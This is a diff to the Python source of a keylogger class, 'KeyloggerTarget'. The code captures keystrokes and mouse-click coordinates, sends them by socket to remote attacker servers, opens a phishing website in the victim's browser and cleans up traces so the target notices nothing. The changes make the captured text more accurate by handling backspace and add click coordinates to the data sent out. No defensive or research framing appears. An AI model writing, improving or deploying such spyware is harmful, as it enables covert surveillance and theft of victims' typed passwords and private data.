@@ -12,12 +12,13 @@ import random
 import requests
 import webbrowser
 import shutil
+from datetime import datetime
 
 
 class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
-                 port_of_timer, duration_in_seconds=200, phishing_web=None):
+                 port_of_timer, duration_in_seconds=60, phishing_web=None):
         # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
         assert duration_in_seconds >= 60, f"{duration_in_seconds} is not greater and not equal to 60"
         # "duration_in_seconds" should always be bigger than 60 seconds
@@ -38,6 +39,7 @@ class KeyloggerTarget:
         self.richtige_liste = []
         self.coordinates = []
         self.word = None
+        self.seconds = []
 
     def daten_aufnehemen(self):
         listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -169,20 +171,24 @@ class KeyloggerTarget:
             # This is like a special code. To split it at the end
             for zeichen in self.richtige_liste:
                 wort += zeichen
+            if self.coordinates:
+                wort += str(self.coordinates)
             data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
             # This let's the server know that the server should shut down
             key_data.connect((ip_keylogger, port_keylogger))
             key_data.send(data.encode())
             key_data.close()
 
+            if os.path.exists("Image.png"):
+                # It will destroy the image so target wound know anything
+                fhandle.close()
+
             new_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             new_server.connect(("127.0.0.1", 1077))
             new_server.send("done".encode())
             new_server.close()
 
-            if os.path.exists("Image.png"):
-                # It will destroy the image so target wound know anything
-                fhandle.close()
+
 
     def kill_switch(self):
         # This function destroys the mouse info
@@ -204,7 +210,7 @@ class KeyloggerTarget:
         with Listener(on_click=self.on_click) as listening:
             self.kill_switch()
             listening.join()
-    
+
     def copy_data(self):
         self.richtige_liste.append(" (COPY (Strg+c)) ")
 
@@ -270,6 +276,22 @@ class KeyloggerTarget:
             else:
                 self.caps = False
 
+            if key == keyboard.Key.backspace:
+                dt = datetime.now()
+                get_time = str(dt).split(":")
+
+                hour, minutes, sec = int(get_time[0][::-1][0:2][::-1]), int(get_time[1]), float(get_time[2])
+
+                all = hour * 3600 + minutes * 60 + sec
+                if not self.seconds:
+                    self.seconds.append(all)
+                minus = all - self.seconds[0]
+                if minus > 0.05 or minus == 0.0:
+                    if self.richtige_liste:
+                        self.richtige_liste.pop(-1)
+
+                self.seconds[0] = all
+
     def on_release(self, key):
         print(f'Key released: {key}')
 
@@ -278,7 +300,7 @@ class KeyloggerTarget:
             while True:
                 try:
                     response = requests.get(self.phishing)
-                    #Respone is here to see if the website is online or not
+                    # Respone is here to see if the website is online or not
                     webbrowser.open(self.phishing)
                     break
 
